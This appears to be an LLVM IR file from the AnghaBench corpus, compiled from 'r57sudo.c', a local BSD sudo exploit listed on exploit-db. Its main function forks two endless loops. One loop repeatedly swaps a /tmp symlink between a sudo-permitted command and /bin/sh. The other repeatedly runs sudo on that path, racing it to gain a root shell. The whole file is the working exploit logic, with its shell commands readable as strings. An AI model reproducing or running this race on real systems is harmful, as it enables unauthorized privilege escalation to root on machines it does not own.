; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_1087.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/local/extr_1087.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [20 x i8] c"r57sudo.c by __blf\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"RusH Security Team\0A\00", align 1
@.str.2 = private unnamed_addr constant [51 x i8] c"Usage: %s <sudo full path command> <sudo command>\0A\00", align 1
@.str.3 = private unnamed_addr constant [27 x i8] c"e.g. ./r57sudo /bin/ls ls\0A\00", align 1
@EX_USAGE = common dso_local global i32 0, align 4
@BUFSIZ = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [18 x i8] c"ln -fs %s /tmp/%s\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"rm /tmp/%s\00", align 1
@.str.6 = private unnamed_addr constant [23 x i8] c"ln -fs /bin/sh /tmp/%s\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"%s /tmp/%s\00", align 1
@SUDO = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* %4, align 4
  %12 = icmp ne i32 %11, 3
  br i1 %12, label %13, label %26

13:                                               ; preds = %2
  %14 = load i32, i32* @stderr, align 4
  %15 = call i32 (i32, i8*, ...) @fprintf(i32 %14, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str, i64 0, i64 0))
  %16 = load i32, i32* @stderr, align 4
  %17 = call i32 (i32, i8*, ...) @fprintf(i32 %16, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %18 = load i32, i32* @stderr, align 4
  %19 = load i8**, i8*** %5, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i32, i8*, ...) @fprintf(i32 %18, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.2, i64 0, i64 0), i8* %21)
  %23 = load i32, i32* @stderr, align 4
  %24 = call i32 (i32, i8*, ...) @fprintf(i32 %23, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.3, i64 0, i64 0))
  %25 = load i32, i32* @EX_USAGE, align 4
  store i32 %25, i32* %3, align 4
  br label %100

26:                                               ; preds = %2
  %27 = call i64 (...) @fork()
  store i64 %27, i64* %6, align 8
  %28 = load i64, i64* %6, align 8
  %29 = icmp eq i64 %28, 0
  br i1 %29, label %30, label %81

30:                                               ; preds = %26
  br label %31

31:                                               ; preds = %30, %31
  %32 = load i32, i32* @BUFSIZ, align 4
  %33 = call i64 @calloc(i32 %32, i32 1)
  %34 = inttoptr i64 %33 to i8*
  store i8* %34, i8** %8, align 8
  %35 = load i32, i32* @BUFSIZ, align 4
  %36 = call i64 @calloc(i32 %35, i32 1)
  %37 = inttoptr i64 %36 to i8*
  store i8* %37, i8** %9, align 8
  %38 = load i8*, i8** %8, align 8
  %39 = call i32 @bzero(i8* %38, i32 8)
  %40 = load i8*, i8** %8, align 8
  %41 = load i32, i32* @BUFSIZ, align 4
  %42 = load i8**, i8*** %5, align 8
  %43 = getelementptr inbounds i8*, i8** %42, i64 1
  %44 = load i8*, i8** %43, align 8
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 2
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %40, i32 %41, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.4, i64 0, i64 0), i8* %44, i8* %47)
  %49 = load i8*, i8** %8, align 8
  %50 = call i32 @system(i8* %49)
  %51 = load i8*, i8** %9, align 8
  %52 = call i32 @bzero(i8* %51, i32 8)
  %53 = load i8*, i8** %9, align 8
  %54 = load i32, i32* @BUFSIZ, align 4
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 2
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %53, i32 %54, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i8* %57)
  %59 = load i8*, i8** %9, align 8
  %60 = call i32 @system(i8* %59)
  %61 = load i8*, i8** %9, align 8
  %62 = call i32 @bzero(i8* %61, i32 8)
  %63 = load i8*, i8** %9, align 8
  %64 = load i32, i32* @BUFSIZ, align 4
  %65 = load i8**, i8*** %5, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 2
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %63, i32 %64, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.6, i64 0, i64 0), i8* %67)
  %69 = load i8*, i8** %9, align 8
  %70 = call i32 @system(i8* %69)
  %71 = load i8*, i8** %9, align 8
  %72 = call i32 @bzero(i8* %71, i32 8)
  %73 = load i8*, i8** %9, align 8
  %74 = load i32, i32* @BUFSIZ, align 4
  %75 = load i8**, i8*** %5, align 8
  %76 = getelementptr inbounds i8*, i8** %75, i64 2
  %77 = load i8*, i8** %76, align 8
  %78 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %73, i32 %74, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i64 0, i64 0), i8* %77)
  %79 = load i8*, i8** %9, align 8
  %80 = call i32 @system(i8* %79)
  br label %31

81:                                               ; preds = %26
  %82 = load i64, i64* %6, align 8
  %83 = icmp sgt i64 %82, 0
  br i1 %83, label %84, label %100

84:                                               ; preds = %81
  br label %85

85:                                               ; preds = %84, %85
  %86 = load i32, i32* @BUFSIZ, align 4
  %87 = sdiv i32 %86, 2
  %88 = call i64 @calloc(i32 %87, i32 1)
  %89 = inttoptr i64 %88 to i8*
  store i8* %89, i8** %10, align 8
  %90 = load i8*, i8** %10, align 8
  %91 = load i32, i32* @BUFSIZ, align 4
  %92 = sdiv i32 %91, 2
  %93 = load i8*, i8** @SUDO, align 8
  %94 = load i8**, i8*** %5, align 8
  %95 = getelementptr inbounds i8*, i8** %94, i64 2
  %96 = load i8*, i8** %95, align 8
  %97 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %90, i32 %92, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i64 0, i64 0), i8* %93, i8* %96)
  %98 = load i8*, i8** %10, align 8
  %99 = call i32 @system(i8* %98)
  br label %85

100:                                              ; preds = %13, %81
  %101 = load i32, i32* %3, align 4
  ret i32 %101
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @fork(...) #1

declare dso_local i64 @calloc(i32, i32) #1

declare dso_local i32 @bzero(i8*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, ...) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
